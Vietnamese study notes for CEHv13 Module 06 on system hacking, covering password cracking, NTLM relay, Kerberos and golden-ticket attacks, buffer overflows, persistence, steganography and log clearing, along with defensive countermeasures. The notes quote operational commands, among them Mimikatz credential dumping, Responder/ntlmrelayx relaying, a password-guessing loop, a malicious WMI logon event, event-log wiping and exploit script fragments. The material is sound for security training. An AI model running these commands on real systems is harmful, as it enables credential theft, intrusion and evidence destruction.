### CEHv13 - Module 06 - System Hacking

System hacking là một trong những mục tiêu quan trọng nhất, và đôi khi là mục tiêu tối thượng của một kẻ tấn công. Kẻ tấn công thu thập thông tin thông qua các kỹ thuật như footprinting, scanning, enumeration, và vulnerability analysis, sau đó sử dụng thông tin này để tấn công hệ thống đích.
...
1. **Quy trình xác thực NTLM đầy đủ của Microsoft:**
   1. Máy khách nhập tên người dùng và mật khẩu vào cửa sổ đăng nhập.
   2. Windows chạy mật khẩu qua một thuật toán băm và tạo ra hàm băm cho mật khẩu được nhập.
   3. Máy khách gửi yêu cầu đăng nhập cùng với tên miền đến bộ điều khiển miền (Domain Controller - DC).
   4. DC tạo ra một chuỗi ký tự ngẫu nhiên 16-byte gọi là "nonce" và gửi nó cho máy khách.
   5. Máy khách mã hóa "nonce" bằng hàm băm của mật khẩu người dùng và gửi trả lại cho DC.
   6. DC truy xuất hàm băm của người dùng từ cơ sở dữ liệu SAM và dùng nó để mã hóa "nonce". DC sau đó so sánh giá trị được mã hóa của chính nó với giá trị nhận được từ máy khách. Nếu khớp, máy khách được xác thực thành công.
...
- Các bước thực hiện tấn công đoán mật khẩu (Password Guessing steps):
  1.  Tìm một người dùng hợp lệ (Find a valid user).
  2.  Tạo danh sách các mật khẩu có thể (Create a list of possible passwords).
  3.  Xếp hạng mật khẩu từ xác suất cao đến thấp (Rank passwords from high to low probability).
  4.  Nhập từng mật khẩu cho đến khi tìm ra mật khẩu đúng (Key in each password).
...
* **Các phương pháp tinh chỉnh từ điển (Tailoring wordlists):**
  - Sử dụng thao tác thao túng chuỗi (string manipulation) cùng với từ điển để tạo ra các đảo chữ (anagrams) (ví dụ: từ "system" thành "metsys").
  - Tùy chỉnh danh sách từ theo mục tiêu bằng cách bao gồm thông tin có khả năng được họ sử dụng làm mật khẩu, chẳng hạn như tên, ngày quan trọng và sở thích (thu thập từ mạng xã hội).
  - Kết hợp các mật khẩu từ các vụ rò rỉ dữ liệu (data breaches) vào danh sách từ.
  - Thay thế các chữ cái bằng số hoặc ký hiệu (ví dụ: "e" thành "3", "i" thành "1") hoặc thêm số/ký hiệu vào cuối mật khẩu.
  - Điều chỉnh danh sách từ dựa trên chính sách mật khẩu của hệ thống đích (ví dụ: độ dài tối thiểu, yêu cầu số/ký hiệu).
  - Thiết kế cuộc tấn công để tránh kích hoạt khóa tài khoản (account lockouts) bằng cách giới hạn số lần thử hoặc phân phối thử nghiệm qua nhiều địa chỉ IP.
  - Sử dụng các công cụ hỗ trợ xử lý song song để tăng số lượng lần thử trong một khung thời gian.

  Phân tích mật mã (Cryptanalysis trong Brute-force): Cryptanalysis là một cuộc tấn công brute-force vào mã hóa sử dụng việc tìm kiếm trong không gian khóa (keyspace) để khôi phục bản rõ (plaintext). Việc phát hiện ra khóa hoặc bản rõ nhanh hơn so với tấn công brute-force là một cách để phá vỡ mật mã. Nếu kẻ tấn công chọn khóa ngẫu nhiên, bản rõ sẽ được tìm thấy trung bình sau khi hệ thống đã thử một nửa số khóa có thể.
...
- **Cracking Kerberos:**
  - **AS-REP Roasting:** Cơ chế hoạt động của AS-REP Roasting: Trong kiểu tấn công này, kẻ tấn công nhắm mục tiêu vào những người dùng có tùy chọn "Do not require Kerberos preauthentication" (Không yêu cầu xác thực trước Kerberos) được bật, hoặc các tài khoản không yêu cầu xác thực trước. Khi chế độ này bị vô hiệu hóa, kẻ tấn công có thể gửi yêu cầu xin vé (TGT) cho tài khoản đó từ DC mà không cần biết mật khẩu của mục tiêu. DC sẽ phản hồi bằng một TGT được mã hóa (AS-REP). Phản hồi này được mã hóa bằng hàm băm mật khẩu của người dùng. Lúc này, kẻ tấn công sẽ bắt giữ gói tin và bẻ khóa ngoại tuyến để tìm ra mật khẩu.
    _Yêu cầu của cuộc tấn công:_ Cần có kết nối trực tiếp với DC để gửi và nhận yêu cầu. Khuyến nghị có tài khoản miền hợp lệ để dễ dàng dùng truy vấn LDAP tìm kiếm người dùng có lỗ hổng (nếu không có, kẻ tấn công phải đoán tên người dùng).
...
- **NTLM Relay:** Chặn và chuyển tiếp (relay) các yêu cầu xác thực NTLM giữa máy khách và máy chủ để mạo danh máy khách. (Công cụ: `Responder`, `ntlmrelayx`, Metasploit).
  - **Các bước thực hiện NTLM Relay Attack (với Responder và Impacket):**
    1. Cài đặt và khởi chạy Responder để đầu độc lưu lượng mDNS, LLMNR và NBT-NS nhằm bắt NetNTLMv2 hash. Lệnh: `./Responder -I eth0`
    2. Sau khi cài đặt Impacket, thiết lập ntlmrelayx và nhắm mục tiêu vào giao thức SMB trên máy nạn nhân để chuyển tiếp phiên NTLM và đợi người dùng truy cập: `impacket-ntlmrelayx.py -of <path_to/SAM-NTLMv2dump file> -tf <path_to/relaytargets> -smb2support`
    3. Khi người dùng truy cập chia sẻ SMB, các hàm băm SAM của hệ thống đích sẽ bị dump ra màn hình.
...
* **Các bước thực hiện Internal Monologue attack:**
  1. Vô hiệu hóa các kiểm soát bảo mật của NetNTLMv1 bằng cách sửa đổi giá trị của LMCompatibilityLevel, NTLMMinClientSec, và RestrictSendingNTLMTraffic.
  2. Trích xuất tất cả các token đăng nhập không qua mạng (non-network logon tokens) từ tất cả các tiến trình đang hoạt động để giả mạo thành người dùng hợp pháp.
  3. Tương tác với NTLM SSP cục bộ, đối với mỗi người dùng bị giả mạo, để lấy phản hồi NetNTLMv1.
  4. Khôi phục (restore) lại các giá trị cấu hình bảo mật về trạng thái ban đầu.
  5. Sử dụng rainbow tables để bẻ khóa mã băm NTLM từ các phản hồi thu được.
  6. Sử dụng hash đã bẻ khóa để giành quyền truy cập cấp hệ thống.
...
* **GPU-based Attack (Tấn công dựa trên GPU):** Kẻ tấn công sử dụng bộ xử lý đồ họa (GPU) thông qua các API đa nền tảng như OpenGL trên trình duyệt web. Kẻ tấn công sử dụng kỹ nghệ xã hội lừa nạn nhân tải ứng dụng độc hại. Sau đó, phần mềm độc hại trên API OpenGL sẽ thiết lập các gián điệp (spy) để theo dõi các hoạt động trên trình duyệt, sao chép mọi ký tự được nhập vào trường mật khẩu thông qua rò rỉ kênh kề (side-channel leaks).
...
- **Tấn công phân tán (Distributed Network Attack - DNA):** Dùng phần mềm chia nhỏ tác vụ và tận dụng sức mạnh xử lý của nhiều máy tính rảnh rỗi trên mạng để bẻ khóa mật khẩu.
  - _Cấu trúc của DNA (Trang 669-670):_ Bao gồm **DNA Server Interface** (Giao diện máy chủ giúp quản lý danh sách _Current Jobs_ - các công việc đang chờ và _Finished Jobs_ - các công việc giải mã đã hoàn tất) và **DNA Client Interface** (Ứng dụng chạy nền trên các máy trạm để điều phối số liệu thống kê và băng thông mạng mà không làm phiền người dùng).
    - **Các tính năng của Distributed Network Attack (DNA):** Dễ dàng đọc số liệu thống kê và biểu đồ, thêm từ điển người dùng để bẻ khóa mật khẩu, tối ưu hóa các cuộc tấn công mật khẩu cho các ngôn ngữ cụ thể, sửa đổi từ điển người dùng, bao gồm chức năng cài đặt máy khách tàng hình (stealth client installation), và tự động cập nhật máy khách trong khi cập nhật máy chủ DNA.
      - **Network Management (Quản lý mạng):** Hộp thoại Network Traffic giúp khám phá tốc độ mạng mà DNA sử dụng và chiều dài từng đơn vị công việc (work-unit) của máy khách DNA. Sự sụt giảm tốc độ truy cập mạng sẽ dẫn đến việc máy khách phải dành nhiều thời gian hơn cho công việc, từ đó gửi ít yêu cầu hơn đến máy chủ DNA để giảm thiểu băng thông.
...
- Sử dụng công cụ `hashcat`. (Ví dụ: `hashcat -a 3 -m 0 md5_hashes.txt ?l?l?l?d?d?d`).
  ...
  - _(Ví dụ về lệnh Hashcat với cờ --increment):_ Để bẻ khóa một mã băm mật khẩu có độ dài không xác định, sử dụng cờ `--increment` bằng cách cung cấp độ dài tối đa và tối thiểu của mật khẩu:
    `hashcat -m 0 -a 3 -i --increment-min=6 --increment-max=10 53ab0df... ?l?l?l?l?l?l?l?l?l?l`
...
- **Tùy chỉnh Bộ ký tự (Custom Charset):** Được sử dụng trong tấn công Mask attack khi kẻ tấn công không chắc chắn về loại ký tự ở một vị trí cụ thể. Kẻ tấn công có thể chỉ định các ký tự tùy chỉnh:
  - `-1 abcdefghijklmnopqrstuvwxyz0123456789`
  - `-1 abcdefghijklmnopqrstuvwxyz?d`
  - `-1 ?l0123456789`
  - `-1 ?l?d`
- **Thuật toán bẻ khóa mật khẩu thủ công (Manual Password-Cracking Algorithm):** Thuật toán tự động đoán mật khẩu sử dụng vòng lặp FOR đơn giản. Vòng lặp lấy danh sách tên người dùng và mật khẩu từ một tệp văn bản (đóng vai trò như từ điển) và lặp qua từng dòng.
  - **Cú pháp ví dụ:** `c:\>FOR /F "tokens=1,2*" %i in (credentials.txt) do net use \\victim.com\IPC$ %j /u:victim.com\%i 2>>nul && echo %time% %date% >> outfile.txt && echo \\victim.com acct: %i pass: %j >> outfile.txt`
- `?a` = `?l?u?d?s` (Tất cả)
- `?b` = 0x00 - 0xff (Byte)
...
- **Vô hiệu hóa NBT-NS (NetBIOS over TCP/IP):** Mở _Control Panel_ -> _Network and Sharing Center_ -> _Change adapter settings_. Nhấp chuột phải vào card mạng -> _Properties_ -> Chọn _TCP/IPv4_ -> _Properties_. Tại tab General, nhấp _Advanced_ -> Tab _WINS_. Trong mục NetBIOS setting, chọn _Disable NetBIOS over TCP/IP_ và nhấn OK.
- **Các biện pháp bổ sung:** Áp dụng SMB signing để ngăn tấn công chuyển tiếp (relay attacks); Giám sát cổng UDP 5355 và 137; Phân đoạn mạng (Network segmentation) để khoanh vùng ảnh hưởng; Sử dụng VPN khi truy cập từ xa.
...
- **NOPS module:** Tạo ra các lệnh "không hoạt động" (no-operation / NOP sled) dùng để lấp đầy bộ đệm (blocking out buffers). Ví dụ lệnh: `msf nop(opty2) > generate -t c 50` (Tạo NOP sled dài 50 byte).
  - **Cấu trúc cơ bản của Auxiliary module bằng Ruby:**
  - Các tùy chọn của NOPS module:
    -b <opt>: Danh sách các ký tự cần tránh (ví dụ: '\x00\xff').
    -h: Hiển thị bảng trợ giúp.
    -s <opt>: Danh sách các thanh ghi cần lưu, cách nhau bằng dấu phẩy.
    -t <opt>: Định dạng đầu ra (Ruby, Perl, C, hoặc raw).
...
- **Post-exploitation modules:** Dùng sau khi đã xâm nhập thành công hệ thống để tương tác sâu hơn (thu thập thông tin, leo thang đặc quyền, duy trì truy cập, di chuyển ngang - pivoting). Ví dụ:
  - `post/windows/gather/enum_logged_on_users`: Liệt kê những người dùng hiện đang đăng nhập.
  - `post/windows/gather/credentials/credential_collector`: Thu thập các thông tin xác thực lưu trong mục tiêu.
  - `post/linux/gather/enum_configs`: Thu thập các tệp cấu hình khác nhau.
  - `post/linux/gather/hashdump`: Trích xuất hash mật khẩu từ Linux.
  - `post/multi/manage/autoroute`: Thêm một route (tuyến) tới mạng cục bộ của mục tiêu thông qua một máy đã thỏa hiệp.
  - `post/windows/manage/portproxy`: Thiết lập luật port-forwarding để pivoting.
...
- Thực thi code nằm trong phân đoạn ngăn xếp (stack segment).
- Lỗi cấp phát bộ nhớ không đúng cách (Improper memory allocation).
...
* **Mã nguồn C ví dụ về Tràn bộ đệm (Simple Buffer Overflow in C):**
...
* **Kịch bản Python thực hiện Fuzzing:**
  ```python
  import sys, socket
...
* **Kịch bản Python gửi byte ngẫu nhiên (Tìm Offset):**
  ```python
  import sys, socket
  offset = "Aa0Aa1...[chuỗi ngẫu nhiên sinh ra từ pattern_create.rb]"
  try:
      soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      soc.connect(('10.10.1.11', 9999))
...
* **Kịch bản Python ghi đè EIP và sinh Shellcode:**
  ```python
  import sys, socket
  # payload sinh ra từ msfvenom
  shellcode = b"\x92\x81\x3e..."
  # offset 2003 byte, 4 byte JMP ESP, 32 byte NOP sled, sau đó là shellcode
...
**Các biện pháp phòng chống Tràn bộ đệm (Defending against Buffer Overflows):**

- Phát triển chương trình theo các quy tắc và hướng dẫn mã hóa an toàn (secure coding practices).
- Sử dụng kỹ thuật ngẫu nhiên hóa bố cục không gian địa chỉ (ASLR) để di chuyển ngẫu nhiên các vị trí không gian địa chỉ của vùng dữ liệu.
- Xác thực đối số và giảm thiểu tối đa các mã yêu cầu đặc quyền root.
- Xác thực độ dài và nội dung của tất cả dữ liệu đầu vào (input data), đặc biệt là dữ liệu từ các nguồn không đáng tin cậy.
- Thực hiện đánh giá mã (code review) ở cấp mã nguồn bằng các trình phân tích mã tĩnh và động.
- Cho phép trình biên dịch thêm ranh giới (bounds) vào tất cả các bộ đệm (implement automatic bound checking).
- Luôn bảo vệ con trỏ trả về (return pointer) trên ngăn xếp.
- Không bao giờ cho phép thực thi mã bên ngoài không gian mã được cấp phép.
- Sử dụng các ngăn xếp không thể thực thi, tức là triển khai Ngăn chặn thực thi dữ liệu (DEP - Data Execution Prevention).
- Thực hiện kiểm tra tính toàn vẹn của con trỏ mã (code pointer integrity checking) để phát hiện con trỏ bị hỏng trước khi nó được sử dụng.
- Tránh sử dụng các hàm không an toàn: Sử dụng strncat thay vì strcat, strncpy thay vì strcpy, và snprintf() thay vì sprintf().
- Sử dụng NX bit để đánh dấu các vùng bộ nhớ là có thể thực thi hoặc không thể thực thi.
- Áp dụng Kiểm tra sâu gói tin (DPI) để phát hiện các nỗ lực khai thác từ xa tại vành đai mạng thông qua chữ ký tấn công.
- Triển khai Bảo vệ ghi đè Trình xử lý ngoại lệ có cấu hình (SEHOP) để ngăn chặn kỹ thuật ghi đè thanh ghi SEH.
- Sử dụng các ngôn ngữ lập trình như Python, COBOL, hoặc Java thay vì C/C++ để tránh các lỗi quản lý bộ nhớ thủ công.
- Sử dụng Stack canaries (các giá trị ngẫu nhiên) đặt trong bộ đệm khiến kẻ tấn công khó ghi đè chính xác.
...
4. **Spectre và Meltdown:** Là lỗ hổng nằm trong thiết kế chip CPU (Intel, AMD, ARM). Lợi dụng các tính năng tối ưu hóa CPU như thực thi suy đoán (speculative execution) và bộ đệm (caching).
   - **Spectre:** Ép CPU đọc các vùng nhớ lân cận vượt quá giới hạn (out-of-bounds), có thể đọc được bộ nhớ kernel.
     Mô tả cách hoạt động của Spectre: Bộ xử lý (processor) bị ép phải hoàn thành một cuộc thực thi suy đoán của một lệnh đọc trước khi việc kiểm tra ranh giới được thực hiện. Do đó, kẻ tấn công có thể truy cập và đọc các vị trí bộ nhớ vượt quá giới hạn (out-of-bounds). Khi thực thi các câu lệnh điều kiện, để xử lý nhanh hơn, bộ xử lý sử dụng dự đoán nhánh (branch prediction) để chọn một đường dẫn nhằm thực thi suy đoán. Kẻ tấn công khai thác điều này để lừa bộ xử lý thực thi các lệnh sai.
...
- Trên macOS, đặt các tệp plist ở chế độ chỉ đọc (read-only).
  ...
  Defend against DCSync Attacks (Phòng chống tấn công DCSync):
  Kiểm tra các quyền được gán cho người dùng và quản trị viên. Theo dõi các tài khoản yêu cầu quyền nhân bản tên miền (domain replication rights).
  Triển khai các công cụ giám sát mạng như Sean Metcalf và StealthDEFEND để thu thập địa chỉ IP của DC và quyết định xem IP nào được phép có trong danh sách nhân bản.
  Giới hạn quyền "Replicate Directory Changes" (Nhân bản thay đổi thư mục) chỉ cho các tài khoản dịch vụ và người dùng được ủy quyền thực sự.
  Triển khai công nghệ đánh lừa (deception technologies) như honeypots và chứng chỉ mồi nhử (decoy credentials) bên trong môi trường AD.
  Defend against PPID Spoofing (Phòng chống giả mạo PPID):
  Xác minh các trường PPID nơi lưu trữ thông tin để phát hiện bất thường.
  Xác định tiến trình cha hợp pháp bằng cách sử dụng event header PID do ETW (Event Tracing for Windows) chỉ định.
  Giới hạn quyền của người dùng và ứng dụng trong việc tạo ra tiến trình mới. Triển khai Allowlisting ứng dụng để giảm bề mặt tấn công.
  Defend against Exploiting AD CS (Phòng chống khai thác Dịch vụ Chứng chỉ AD):
  Sử dụng giải pháp Quản lý truy cập đặc quyền (PAM) để kiểm soát và giám sát truy cập quản trị vào các máy chủ AD CS.
  Áp dụng các baseline bảo mật để củng cố cấu hình của máy chủ AD CS và phân đoạn mạng để cách ly máy chủ này khỏi các mạng không đáng tin cậy.
...
**Các biện pháp phòng chống Lỗ hổng Spectre và Meltdown (Defending against Spectre and Meltdown Vulnerabilities):**

- Thường xuyên cập nhật và vá lỗi hệ điều hành và firmware.
- Giám sát liên tục các ứng dụng và dịch vụ quan trọng chạy trên hệ thống.
- Cài đặt và cập nhật phần mềm chặn quảng cáo (ad-blockers) và chống phần mềm độc hại để chặn việc tiêm mã độc qua các trang web bị xâm phạm.
- Chặn các dịch vụ và ứng dụng cho phép người dùng không có đặc quyền thực thi mã.
- Sử dụng các giải pháp Ngăn ngừa mất dữ liệu (DLP) để ngăn chặn rò rỉ thông tin quan trọng từ bộ nhớ chạy (runtime memory).
- Thực hiện các biện pháp giảm thiểu rủi ro về phần cứng và phần mềm, chẳng hạn như theo dõi "speculative taint tracking" (vết thực thi suy đoán).
- Triển khai mã hóa đồng hình (Homomorphic encryption - HME) để xử lý an toàn thông tin quan trọng.
- Sử dụng các tùy chọn của trình biên dịch và các tính năng được thiết kế để giảm thiểu lỗ hổng Spectre, chẳng hạn như retpoline (một cấu trúc phần mềm) và speculative load hardening (tăng cường tải suy đoán).
...
- **Exploitation for Client Execution (Khai thác để thực thi trên máy khách)** [Trang 826]: Khai thác các hành vi mã hóa không an toàn trong phần mềm ứng dụng khách. Bao gồm các loại sau:
  ...
  - _(Bổ sung từ nguồn)_ **Third-Party Applications-Based Exploitation:** Khai thác các ứng dụng của bên thứ ba được triển khai trên hệ thống (ví dụ: Adobe Reader, Flash).
    - **Service Execution (Thực thi dịch vụ):** Kẻ tấn công chạy các tệp nhị phân hoặc lệnh có thể giao tiếp với các dịch vụ hệ thống của Windows (Service Control Manager) để tạo dịch vụ mới hoặc sửa đổi dịch vụ hiện có nhằm duy trì truy cập.
    - **Windows Management Instrumentation (WMI):** Lạm dụng tính năng WMI để thu thập thông tin, thực thi mã từ xa và di chuyển ngang (lateral movement). WMI giúp kẻ tấn công tương tác thông qua DCOM (cổng 135) hoặc WinRM.
    - **Windows Remote Management (WinRM):** Giao thức cho phép thực thi tệp tin, sửa đổi dịch vụ và registry từ xa. Kẻ tấn công có thể sử dụng lệnh winrm để thực thi payload qua cổng HTTP 5985 và HTTPS 5986.
    - **Dameware Remote Support:** Công cụ quản lý và điều khiển từ xa hợp pháp dành cho quản trị viên Windows, nhưng thường bị kẻ tấn công lạm dụng để thao túng môi trường Active Directory và duy trì quyền điều khiển.
    - **Các công cụ thực thi ứng dụng từ xa khác (Tools for Executing Applications):** Ngoài Dameware, kẻ tấn công (hoặc chuyên gia bảo mật) cũng sử dụng các công cụ như **Ninja**, **Pupy**, **PDQ Deploy**, **ManageEngine Endpoint Central**, và **PsExec** để thực thi các ứng dụng từ xa, qua đó tiến hành leo thang đặc quyền hoặc các hoạt động độc hại khác.
...
**Các bước phát hiện Rootkit (Steps for Detecting Rootkits):**

- Phân tích dựa trên ảo hóa (Virtualization-Based Analysis): Sử dụng các kỹ thuật xem xét nội tâm (introspection) để giám sát và phân tích hệ điều hành khách nhằm tìm kiếm các dấu hiệu của rootkit ảo, hoạt động ở lớp hypervisor.
- Kiểm tra thủ công File System và Registry:
  - Chạy `dir /s /b /ah` và `dir /s /b /a-h` bên trong HĐH nghi ngờ bị nhiễm và lưu lại kết quả.
  - Khởi động máy bằng USB sạch (chẳng hạn dùng WinPE), sau đó chạy lại hai lệnh trên cho cùng một ổ đĩa đĩa cứng.
  - Chạy công cụ WinMerge để so sánh hai tệp kết quả nhằm phát hiện các tệp ẩn (vô hình ở chế độ bình thường nhưng hiện ra khi boot ngoài OS).
  - Đối với Registry: Chạy `regedit.exe` từ trong HĐH bị nhiễm và xuất các nhánh (hives) `HKEY_LOCAL_MACHINE\SOFTWARE` và `\SYSTEM` ra file text.
  - Khởi động bằng USB sạch, load các hive Registry tương ứng từ đĩa cứng (tại `c:\windows\system32\config\software` và `\system`), chuyển đổi sang text.
  - Dùng WinMerge so sánh kết quả để phát hiện mã độc ẩn dấu khóa registry.
...
- **Các biện pháp phòng chống Rootkits (How to Defend against Rootkits):**
  - Cài đặt lại toàn bộ hệ điều hành (Reinstall OS) và ứng dụng từ một nguồn tin cậy sau khi đã sao lưu các dữ liệu quan trọng (chỉ backup dữ liệu, không backup file thực thi bị nghi nhiễm).
  - Thường xuyên thực hiện phân tích bản sao (dump) bộ nhớ hạt nhân để phát hiện sự hiện diện của rootkit.
  - Giáo dục nhân viên không tải xuống bất kỳ tệp hoặc chương trình nào từ các nguồn không đáng tin cậy.
  - Đảm bảo phần mềm diệt virus đang sử dụng có tích hợp khả năng bảo vệ chống rootkit.
  - Đảm bảo tính sẵn sàng của các phương tiện khôi phục hệ thống đáng tin cậy (trusted restoration media).
  - Thiết lập mạng và tường lửa dựa trên máy chủ (host-based firewalls).
...
**Các biện pháp phòng chống NTFS Streams (How to Defend against NTFS Streams):**

- Để xóa các luồng NTFS ẩn, hãy di chuyển các tệp bị nghi ngờ sang phân vùng định dạng FAT (File Allocation Table).
- Sử dụng công cụ kiểm tra tính toàn vẹn tệp của bên thứ ba, chẳng hạn như Tripwire File Integrity Manager, để duy trì tính toàn vẹn của các tệp phân vùng NTFS.
- Sử dụng các tiện ích của bên thứ ba để hiển thị và thao tác các luồng ẩn, chẳng hạn như EventSentry SysAdmin Tools hoặc lads.exe.
- Bật quét virus theo thời gian thực để bảo vệ hệ thống khỏi việc thực thi các luồng dữ liệu độc hại.
- Đối với việc xử lý ADS, hãy triển khai phần mềm có khả năng sao lưu luồng, chẳng hạn như Veritas Backup Exec.
- Giám sát các quyền cụ thể cần thiết để đọc và ghi các thuộc tính mở rộng (extended attributes) của NTFS.
...
- **Phân loại:**
  ...
  - **Computer-based Steganography Techniques (Các kỹ thuật giấu tin bằng máy tính):** Dựa trên cách sửa đổi môi trường che giấu, bao gồm 6 nhóm:
    - **Substitution Techniques (Kỹ thuật thay thế):** Thay thế các bit ít quan trọng nhất (insignificant bits) bằng thông điệp bí mật.
    - **Transform Domain Techniques (Kỹ thuật biến đổi miền):** Giấu thông tin vào các phần quan trọng của hình ảnh (như nén, cắt xén, xử lý ảnh) khiến việc trích xuất khó khăn hơn.
    - **Spread Spectrum Techniques (Kỹ thuật trải phổ):** Tín hiệu truyền thông chiếm nhiều băng thông hơn mức cần thiết, truyền thông điệp thông qua mã dải phổ để tránh bị đánh chặn.
    - **Statistical Techniques (Kỹ thuật thống kê):** Thay đổi một số thuộc tính thống kê của vỏ bọc (cover) để giấu dữ liệu.
    - **Distortion Techniques (Kỹ thuật biến dạng):** Gửi các tín hiệu truyền đạt các sửa đổi đối với vỏ bọc để tạo ra stego-object. Người nhận đo lường sự khác biệt với vỏ bọc gốc để giải mã.
    - **Cover Generation Techniques (Kỹ thuật tạo vỏ bọc):** Các đối tượng kỹ thuật số được tạo ra dành riêng cho mục đích che giấu thông tin giao tiếp bí mật.
  - **Linguistic Steganography (Giấu tin ngôn ngữ):** Bao gồm Semagrams (Giấu qua dấu hiệu hình ảnh, hoặc đổi phông chữ/khoảng trắng trong văn bản) và Open Codes (Giấu trong ngôn ngữ hợp pháp qua Jargon codes/mã lóng, hoặc Covered ciphers như Null ciphers, Grille ciphers).
    - **Các kỹ thuật giấu tin (Steganography) cụ thể:**
      Null ciphers: Kỹ thuật dùng để giấu thông điệp bên trong một lượng lớn dữ liệu vô dụng. Dữ liệu gốc được trộn lẫn với dữ liệu không sử dụng theo bất kỳ thứ tự nào (ngang, chéo, dọc) sao cho không ai hiểu được ngoại trừ người biết quy luật.
      Grille ciphers: Kỹ thuật dùng để mã hóa bản rõ bằng cách viết nó lên một tờ giấy thông qua một tấm lưới có đục lỗ (pierced/stenciled sheet) bằng bìa cứng hoặc vật liệu tương tự. Chỉ người có tấm lưới (grille) chính xác mới giải mã được.
- **Steganography dựa trên Cover Medium (Môi trường che giấu):**
  - **Image:** Phổ biến nhất, thay thế bit ít quan trọng nhất (LSB insertion), Masking & Filtering, hoặc các thuật toán biến đổi (Fast Fourier, Wavelet). (Công cụ: OpenStego, StegOnline).
    - _(Chi tiết Masking & Filtering):_ Việc Masking (Che dấu) cho phép giấu dữ liệu bí mật vào các file ảnh thang độ xám (grayscale) và 24-bit. Kỹ thuật này che giấu thông điệp do sự thay đổi về độ chói là không đáng kể, khiến mắt người không phát hiện ra. Việc masking đối với ảnh JPEG (chuẩn nén lossy) tỏ ra rất hiệu quả vì chúng miễn nhiễm với các thao tác cắt xén và nén ảnh (cropping and compression).
    - _(Chi tiết Algorithms and Transformation):_ Sử dụng hàm toán học để ẩn thông tin trong quá trình nén ảnh bằng cách thay đổi hệ số (coefficient) của các bit thấp nhất. Các thuật toán nén bao gồm: Chuyển đổi Fourier nhanh (Fast Fourier), Chuyển đổi cosine rời rạc (Discrete cosine - DCT dùng cho JPEG), và Chuyển đổi Wavelet.
  ...
  - **Web Steganography:** Ẩn các đối tượng web đằng sau các đối tượng khác và tải chúng lên máy chủ web.
  - **Natural Text Steganography:** Quá trình chuyển đổi thông tin nhạy cảm thành các đoạn hội thoại tự do do người dùng xác định (chẳng hạn như một vở kịch).
  - **Hidden OS Steganography:** Quá trình ẩn một Hệ điều hành vào trong một Hệ điều hành khác.
  - **C++ Source-Code Steganography:** Giấu một bộ công cụ vào bên trong các file mã nguồn C++.
  - **Compressed Data Steganography:** Giấu thông tin vào các bit ít quan trọng (LSB) hoặc bit dự trữ của file nén (như ZIP, RAR, JPEG lossy, hoặc PNG lossless).
...
- **Chi-square attack:** Phương pháp dựa trên phân tích xác suất để kiểm tra xem đối tượng stego và dữ liệu gốc có giống nhau hay không.
- **Distinguishing statistical attack:** Kẻ tấn công phân tích thuật toán được nhúng để phát hiện các thay đổi thống kê khác biệt cùng với độ dài của dữ liệu được nhúng.
- **Blind classifier attack:** Một bộ phát hiện mù (blind detector) được cung cấp dữ liệu gốc hoặc chưa sửa đổi để học cách nhận diện, sau đó đào tạo bộ phân loại để phát hiện sự khác biệt giữa stego-object và dữ liệu gốc.
...
- **Các con đường thống trị tên miền (Domain Dominance Paths):** Kẻ tấn công có thể kiểm soát các tài sản quan trọng thông qua các kỹ thuật đa dạng bao gồm: Thực thi mã từ xa (Remote code execution), Lạm dụng DPAPI, Sao chép độc hại (Malicious replication), Tấn công Skeleton key, và Tấn công Golden/Silver ticket.
  - _Các lệnh khai thác Golden Ticket (Sử dụng Mimikatz):_
    1. Lấy thông tin SID của miền bằng lệnh `whoami`.
    2. Nâng cao đặc quyền để đánh cắp NTLM hash của KRBTGT bằng lệnh DCSync: `lsadump::dcsync /domain:<domain name> /user:krbtgt`
    3. Tạo Golden ticket bằng cách mạo danh người dùng cấp quản trị: `kerberos::golden /domain:<domain name> /sid:<SID> /rc4:<KRBTGT hash value> /id:<value> /user:<username>`
  - _Lưu ý về Silver Ticket:_ Tấn công vé bạc nhắm vào việc đánh cắp thông tin xác thực của người dùng hợp pháp để tạo ra vé TGS giả. Yêu cầu xác thực PAC (Privilege Attribute Certificate) là tùy chọn trong tấn công vé bạc. Lệnh giải nén mã băm NTLM của hệ thống AD khi đã có quyền admin cục bộ: `mimikatz "privilege::debug" "sekurlsa::logonpasswords"`.
...
- **Wmi-Persistence (Kịch bản WMI):** Sử dụng kịch bản PowerShell (Wmi-Persistence) để tạo đăng ký sự kiện WMI (Event Subscriptions). Cho phép chạy các payload độc hại mỗi khi hệ thống khởi động lại, log on, hoặc hẹn giờ mà không cần ghi file thực thi lên đĩa. Lệnh kiểm tra sự kiện: `Get-WmiEvent`. - _Lệnh thực thi Wmi-Persistence (Trang 930-931):_
  ...
  _Sử dụng PowerLurk để thiết lập Wmi-Persistence:_
  PowerLurk là bộ công cụ PowerShell hỗ trợ xây dựng các đăng ký sự kiện WMI độc hại (như InsertUSB, UserLogon, Timed, ProcessStart). 1. Nhập tập lệnh: `Import-Module .\PowerLurk.ps1` 2. Liệt kê đối tượng: `Get-WmiEvent` 3. Tạo đăng ký thực thi payload độc hại khi người dùng đăng nhập: `Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any`
...
- **Windows:** Kẻ tấn công có thể xóa thủ công qua Event Viewer, dùng script `.bat` (chứa các lệnh `wevtutil cl`), PowerShell (`Clear-EventLog -LogName application, system`), hoặc dùng Meterpreter (`clearev`). Công cụ dòng lệnh `wevtutil el` giúp liệt kê các log.
  - Auditpol.exe (Cấu hình Audit Logging): Công cụ dòng lệnh dùng để điều chỉnh cài đặt kiểm toán an ninh. Kẻ tấn công khi có quyền admin sẽ lập tức tắt tính năng ghi nhật ký.
    Lệnh bật: C:\>auditpol /set /category:”system”,“account logon” /success:enable /failure:enable
    Lệnh tắt: C:\>auditpol /set /category:”system”,“account logon” /success:disable /failure:disable
  - wevtutil (Xóa Event Logs thủ công):
    Hiển thị danh sách các event logs: >wevtutil el
    Xóa một event log cụ thể: >wevtutil cl <log_name> (Ví dụ: wevtutil cl system)
  - Clear_Event_Viewer_Logs.bat: Một tiện ích mã lệnh batch tải từ tenforums.com để tự động dọn dẹp các bản ghi system, security, và application thông qua Command Prompt khi chạy bằng quyền Administrator.
- **Linux:** Ghi đè file lịch sử Bash bằng `cat /dev/null > ~/.bash_history && history -c && exit` hoặc dùng công cụ `shred ~/.bash_history` để băm nát file khiến không thể khôi phục. Các log hệ thống thường nằm ở `/var/log/`.
  - Xóa bộ nhớ đệm PowerShell (Clearing PowerShell History):
    Vô hiệu hóa việc lưu trữ lệnh (lần chạy hiện tại): Set-PSReadlineOption -HistorySaveStyle SaveNothing
    Xóa các lệnh đã lưu vào bộ đệm: Clear-History
  - Xóa lịch sử lệnh Linux (Linux History):
